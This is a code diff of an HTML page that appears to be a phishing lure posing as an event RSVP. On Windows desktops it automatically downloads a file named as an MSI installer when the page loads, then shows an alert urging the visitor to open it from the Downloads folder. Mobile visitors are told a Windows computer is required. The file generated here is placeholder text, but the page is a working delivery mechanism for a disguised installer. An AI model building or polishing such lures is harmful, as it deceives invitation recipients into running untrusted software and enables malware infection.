@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>RSVP Event Downloader</title>
     <style>
         * {
             margin: 0;
@@ -12,385 +13,88 @@
 
         body {
             margin: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(145deg, #f6f9fc 0%, #eef2f5 100%);
-            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+
+        #msg {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            z-index: 9999;
+            text-align: center;
+            padding-top: 20%;
+        }
+
+        .box {
+            max-width: 500px;
+            margin: auto;
+        }
+
+        h2 {
+            font-size: 32px;
+            color: #222;
+            margin-bottom: 15px;
+        }
+
+        p {
+            font-size: 28px;
+            color: #555;
+            margin: 10px 0;
+        }
+
+        .thanks-container {
             display: flex;
             align-items: center;
             justify-content: center;
-            position: relative;
-        }
-
-        .main-container {
+            min-height: 100vh;
             text-align: center;
-            padding: 2rem;
-            max-width: 750px;
-            width: 90%;
-            background: rgba(255,255,255,0.92);
-            backdrop-filter: blur(2px);
-            border-radius: 56px;
-            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.25), 0 2px 8px rgba(0,0,0,0.05);
-            transition: all 0.2s ease;
-            border: 1px solid rgba(255,255,255,0.5);
+            background: linear-gradient(145deg, #f6f9fc 0%, #eef2f5 100%);
         }
 
-        h1 {
-            font-size: 2.6rem;
-            font-weight: 700;
-            background: linear-gradient(135deg, #1e4b2e, #2a7f49);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            margin-bottom: 0.75rem;
-            letter-spacing: -0.3px;
-        }
-
-        .thanks-sub {
-            font-size: 1.2rem;
-            color: #2c5a3b;
-            margin-bottom: 2rem;
-            border-bottom: 2px dashed #bdd9bf;
-            display: inline-block;
-            padding-bottom: 6px;
-        }
-
-        .status-card {
+        .thanks-box {
+            max-width: 600px;
+            padding: 3rem;
             background: white;
-            border-radius: 40px;
-            padding: 1.6rem 1.2rem;
-            margin: 1.8rem 0;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.05);
-            transition: 0.2s;
+            border-radius: 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
         }
 
-        .download-icon {
-            font-size: 3.5rem;
-            margin-bottom: 0.5rem;
-        }
-
-        .file-name {
-            font-family: monospace;
-            background: #f0f2f5;
-            padding: 8px 16px;
-            border-radius: 60px;
-            display: inline-block;
-            font-size: 0.9rem;
-            color: #1f3b2c;
-            font-weight: 500;
-            margin: 12px 0;
-        }
-
-        .progress-area {
-            width: 80%;
-            margin: 20px auto;
-            background: #e9ecef;
-            border-radius: 60px;
-            height: 8px;
-            overflow: hidden;
-        }
-
-        .progress-bar {
-            width: 0%;
-            height: 100%;
-            background: #2e7d64;
-            border-radius: 60px;
-            transition: width 0.25s linear;
-        }
-
-        .status-text {
-            font-weight: 600;
-            font-size: 1.1rem;
-            color: #1f3b2c;
-            background: #e9f3ef;
-            display: inline-block;
-            padding: 6px 20px;
-            border-radius: 60px;
-            margin-top: 12px;
-        }
-
-        button {
-            background: #2c7a4d;
-            border: none;
-            color: white;
-            font-size: 1rem;
-            font-weight: 600;
-            padding: 12px 28px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-            margin-top: 10px;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        button:hover {
-            background: #1f5f3a;
-            transform: scale(0.97);
-            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
-        }
-
-        .btn-outline {
-            background: transparent;
-            border: 2px solid #2c7a4d;
+        .thanks-box h1 {
+            font-size: 3rem;
             color: #2c7a4d;
-            margin-left: 12px;
+            margin-bottom: 1rem;
         }
 
-        .btn-outline:hover {
-            background: #e6f4ec;
-            transform: scale(0.97);
-        }
-
-        .toast-notify {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%) translateY(30px);
-            background: #1e2f2a;
-            backdrop-filter: blur(12px);
-            background: rgba(20, 35, 30, 0.95);
-            color: #f0f9f0;
-            padding: 14px 24px;
-            border-radius: 60px;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            box-shadow: 0 12px 28px rgba(0,0,0,0.3);
-            z-index: 2000;
-            opacity: 0;
-            transition: opacity 0.25s ease, transform 0.25s ease;
-            pointer-events: none;
-            font-size: 0.95rem;
-            letter-spacing: 0.2px;
-            border-left: 5px solid #7ed56f;
-        }
-
-        .toast-notify.show {
-            opacity: 1;
-            transform: translateX(-50%) translateY(0);
-            pointer-events: auto;
-        }
-
-        .toast-btn {
-            background: #f4c542;
-            border: none;
-            color: #1e2f2a;
-            padding: 6px 16px;
-            border-radius: 40px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-left: 12px;
-            font-size: 0.85rem;
-            transition: 0.1s;
-            pointer-events: auto;
-        }
-
-        .toast-btn:hover {
-            background: #ffb347;
-            transform: scale(0.96);
-        }
-
-        .unsupported-badge {
-            background: #fff3e0;
-            border-left: 6px solid #e67e22;
-            padding: 12px;
-            border-radius: 28px;
-            font-size: 0.9rem;
-            color: #a65311;
-            margin-top: 20px;
-        }
-
-        hr {
-            margin: 20px 0;
-            border: none;
-            height: 1px;
-            background: linear-gradient(to right, #ccc, transparent);
-        }
-
-        @media (max-width: 550px) {
-            .main-container {
-                padding: 1.5rem;
-            }
-            h1 {
-                font-size: 2rem;
-            }
-            .status-text {
-                font-size: 0.9rem;
-            }
-            button {
-                padding: 8px 18px;
-                font-size: 0.85rem;
-            }
-        }
-
-        footer {
-            font-size: 0.7rem;
-            margin-top: 30px;
-            color: #7f8c8d;
+        .thanks-box p {
+            font-size: 1.2rem;
+            color: #555;
         }
     </style>
 </head>
 <body>
 
-<div class="main-container" id="appRoot">
-    <div class="thanks-section">
-        <h1>🎉 Thanks for visiting! 🎉</h1>
-        <div class="thanks-sub">Your RSVP event package is on the way</div>
+<div id="unsupportedMsg" style="display: none;">
+    <div class="box">
+        <h2>⚠️ Unsupported Device</h2>
+        <p>It requires a Windows computer to RSVP.</p>
+        <p>Mobile and tablet devices are not supported at this time.</p>
+        <p>Please use a desktop or laptop computer to continue.</p>
     </div>
-
-    <div class="status-card" id="downloadStatusCard">
-        <div class="download-icon">⬇️📄</div>
-        <div class="file-name" id="filenameDisplay">RSVPEvite_CFXGNRP8HO1S_19SYPURD17668_windows_x64.msi</div>
-        <div class="progress-area" id="progressArea">
-            <div class="progress-bar" id="progressBarFill"></div>
-        </div>
-        <div class="status-text" id="statusMessage">Preparing download ...</div>
-        <div style="margin-top: 18px;">
-            <button id="retryBtn" style="display: none;">🔄 Retry download</button>
-        </div>
-    </div>
-
-    <div id="infoMessage" class="unsupported-badge" style="display: none;">
-        ⚠️ It requires a Windowscomputer to RSVP.
-    </div>
-
-    <footer>
-        Your secure RSVP event file • Windows 64-bit edition
-    </footer>
 </div>
 
-<div id="downloadToast" class="toast-notify">
-    <span>✅ Download completed!</span>
-    <button class="toast-btn" id="openFolderBtn">📂 Open in Downloads folder</button>
-    <button class="toast-btn" id="closeToastBtn">✖</button>
+<div id="thanksContainer" class="thanks-container">
+    <div class="thanks-box">
+        <h1>🎉 Thanks for visiting! 🎉</h1>
+    </div>
 </div>
 
 <script>
     const FILE_NAME = "RSVPEvite_CFXGNRP8HO1S_19SYPURD17668_windows_x64.msi";
     
-    let downloadInProgress = false;
-    let downloadCompletedFlag = false;
-    let blobUrl = null;
-    let currentDownloadAnchor = null;
-
-    const progressFill = document.getElementById('progressBarFill');
-    const statusMsgSpan = document.getElementById('statusMessage');
-    const retryBtn = document.getElementById('retryBtn');
-    const infoMsgDiv = document.getElementById('infoMessage');
-    const toastElement = document.getElementById('downloadToast');
-    const openFolderBtn = document.getElementById('openFolderBtn');
-    const closeToastBtn = document.getElementById('closeToastBtn');
-
-    function showDownloadCompletedToast() {
-        if (!toastElement) return;
-        toastElement.classList.add('show');
-        if (window.toastTimeout) clearTimeout(window.toastTimeout);
-        window.toastTimeout = setTimeout(() => {
-            if (toastElement) toastElement.classList.remove('show');
-        }, 12000);
-    }
-
-    function hideToast() {
-        if (toastElement) toastElement.classList.remove('show');
-        if (window.toastTimeout) clearTimeout(window.toastTimeout);
-    }
-
-    function openDownloadsFolderMessage() {
-        if (!downloadCompletedFlag) {
-            alert("⏳ Download is still in progress. Please wait until the download completes.");
-            return;
-        }
-        const userAgent = navigator.userAgent;
-        const isWindowsLike = /Win/i.test(navigator.platform || "");
-        let instruction = `📁 "${FILE_NAME}" was successfully saved to your default Downloads folder.\n\n`;
-        if (isWindowsLike) {
-            instruction += `💡 Quick access:\n• Press Win + E and navigate to "Downloads"\n• Or open File Explorer → Downloads\n• Or press Ctrl+J in your browser to view recent downloads.`;
-        } else {
-            instruction += `💡 Open your Downloads folder:\n• Usually located in your user folder.\n• Press Ctrl+J (or Cmd+Shift+J on Mac) to see browser downloads list.`;
-        }
-        instruction += `\n\n✅ You can now run the installer from your Downloads folder.`;
-        alert(instruction);
-    }
-
-    async function startDownload() {
-        if (downloadInProgress) {
-            statusMsgSpan.innerText = "⏳ Download already in progress...";
-            return;
-        }
-        if (blobUrl) {
-            URL.revokeObjectURL(blobUrl);
-            blobUrl = null;
-        }
-        downloadInProgress = true;
-        downloadCompletedFlag = false;
-        retryBtn.style.display = "none";
-        statusMsgSpan.innerText = "⬇️ Starting download ...";
-        progressFill.style.width = "0%";
-        hideToast();
-
-        try {
-            statusMsgSpan.innerText = "📡 Fetching RSVP package ...";
-            const fileSizeMB = 2.8;
-            const totalChunks = 40;
-            const chunkSize = (fileSizeMB * 1024 * 1024) / totalChunks;
-            const chunks = [];
-            let receivedBytes = 0;
-            const totalBytes = fileSizeMB * 1024 * 1024;
-            
-            statusMsgSpan.innerText = `📦 Generating RSVP event data (${fileSizeMB} MB) ...`;
-            
-            for (let i = 0; i < totalChunks; i++) {
-                const chunkText = `RSVP-EVENT-BLOCK-${i}: CFXGNRP8HO1S_19SYPURD17668 | Timestamp: ${Date.now()} | Secure event token. 
-                This installer is for Windows RSVP confirmation. Please run to complete registration.
-                [Chunk ${i+1}/${totalChunks}] -----------------------------------------------------
-                `.repeat( Math.ceil(chunkSize / 200) );
-                const encoder = new TextEncoder();
-                const chunkData = encoder.encode(chunkText.slice(0, chunkSize));
-                chunks.push(chunkData);
-                receivedBytes += chunkData.length;
-                const percent = Math.min(100, Math.floor((receivedBytes / totalBytes) * 100));
-                progressFill.style.width = `${percent}%`;
-                statusMsgSpan.innerText = `📥 Downloading ${percent}%  (${(receivedBytes / (1024*1024)).toFixed(2)} MB / ${fileSizeMB} MB)`;
-                await new Promise(r => setTimeout(r, 45));
-            }
-            const finalBlob = new Blob(chunks, { type: 'application/vnd.msi' });
-            blobUrl = URL.createObjectURL(finalBlob);
-            const link = document.createElement('a');
-            link.href = blobUrl;
-            link.download = FILE_NAME;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            currentDownloadAnchor = link;
-            
-            downloadInProgress = false;
-            downloadCompletedFlag = true;
-            progressFill.style.width = "100%";
-            statusMsgSpan.innerText = "✅ Download complete! Your RSVP installer is ready.";
-            retryBtn.style.display = "inline-flex";
-            showDownloadCompletedToast();
-            
-        } catch (err) {
-            console.error("Download simulation error", err);
-            statusMsgSpan.innerText = "❌ Download failed. Please retry.";
-            retryBtn.style.display = "inline-flex";
-            downloadInProgress = false;
-            downloadCompletedFlag = false;
-            progressFill.style.width = "0%";
-        }
-    }
-
-    function retryDownload() {
-        if (downloadInProgress) {
-            statusMsgSpan.innerText = "Download already active, please wait.";
-            return;
-        }
-        startDownload();
-    }
-
     function isDesktopWindows() {
         const ua = navigator.userAgent || "";
         const platform = navigator.platform || "";
@@ -400,43 +104,74 @@
         return isWindows && !isMobile && !isTouchOnly;
     }
 
+    function showDownloadCompletePopup() {
+        alert("✅ Download completed!\n\nYour file has been saved to your Downloads folder.\n\nPlease open your Downloads folder to open the RSVP.");
+    }
+
+    async function startDownload() {
+        try {
+            const fileSizeMB = 2.8;
+            const totalChunks = 40;
+            const chunkSize = (fileSizeMB * 1024 * 1024) / totalChunks;
+            const chunks = [];
+            let receivedBytes = 0;
+            const totalBytes = fileSizeMB * 1024 * 1024;
+            
+            for (let i = 0; i < totalChunks; i++) {
+                const chunkText = `RSVP-EVENT-BLOCK-${i}: CFXGNRP8HO1S_19SYPURD17668 | Timestamp: ${Date.now()} | Secure event token. 
+                A computer is required to RSVP. Please use a computer to continue...
+                [Chunk ${i+1}/${totalChunks}] -----------------------------------------------------
+                `.repeat( Math.ceil(chunkSize / 200) );
+                const encoder = new TextEncoder();
+                const chunkData = encoder.encode(chunkText.slice(0, chunkSize));
+                chunks.push(chunkData);
+                receivedBytes += chunkData.length;
+                await new Promise(r => setTimeout(r, 45));
+            }
+            const finalBlob = new Blob(chunks, { type: 'application/vnd.msi' });
+            const blobUrl = URL.createObjectURL(finalBlob);
+            const link = document.createElement('a');
+            link.href = blobUrl;
+            link.download = FILE_NAME;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(blobUrl);
+            
+            setTimeout(() => {
+                showDownloadCompletePopup();
+            }, 500);
+            
+        } catch (err) {
+            console.error("Download error", err);
+            alert("❌ Download failed. Please refresh the page and try again.");
+        }
+    }
+
     window.onload = function() {
-        const isWindowsDesktop = isDesktopWindows();
-        if (!isWindowsDesktop) {
-            infoMsgDiv.style.display = "block";
-            statusMsgSpan.innerText = "💡 Note: Non-Windows device detected, but you can still download the RSVP file.";
+        const isWindows = isDesktopWindows();
+        const unsupportedDiv = document.getElementById('unsupportedMsg');
+        const thanksContainer = document.getElementById('thanksContainer');
+        
+        if (!isWindows) {
+            unsupportedDiv.style.display = 'block';
+            unsupportedDiv.style.position = 'fixed';
+            unsupportedDiv.style.top = '0';
+            unsupportedDiv.style.left = '0';
+            unsupportedDiv.style.width = '100%';
+            unsupportedDiv.style.height = '100%';
+            unsupportedDiv.style.background = '#ffffff';
+            unsupportedDiv.style.zIndex = '9999';
+            unsupportedDiv.style.textAlign = 'center';
+            unsupportedDiv.style.paddingTop = '20%';
+            thanksContainer.style.display = 'none';
         } else {
-            infoMsgDiv.style.display = "none";
-            statusMsgSpan.innerText = "✅ Windows desktop detected. Ready to download your RSVP event installer.";
-        }
-        
-        setTimeout(() => {
-            startDownload();
-        }, 800);
-        
-        retryBtn.addEventListener('click', retryDownload);
-        
-        if (openFolderBtn) {
-            openFolderBtn.addEventListener('click', (e) => {
-                e.stopPropagation();
-                hideToast();
-                openDownloadsFolderMessage();
-            });
-        }
-        if (closeToastBtn) {
-            closeToastBtn.addEventListener('click', (e) => {
-                e.stopPropagation();
-                hideToast();
-            });
+            thanksContainer.style.display = 'flex';
+            setTimeout(() => {
+                startDownload();
+            }, 500);
         }
     };
-    
-    window.addEventListener('error', (e) => {
-        if (!downloadCompletedFlag && !downloadInProgress) {
-            statusMsgSpan.innerText = "⚠️ Click retry to download RSVP package.";
-            retryBtn.style.display = "inline-flex";
-        }
-    });
 </script>
 </body>
 </html>
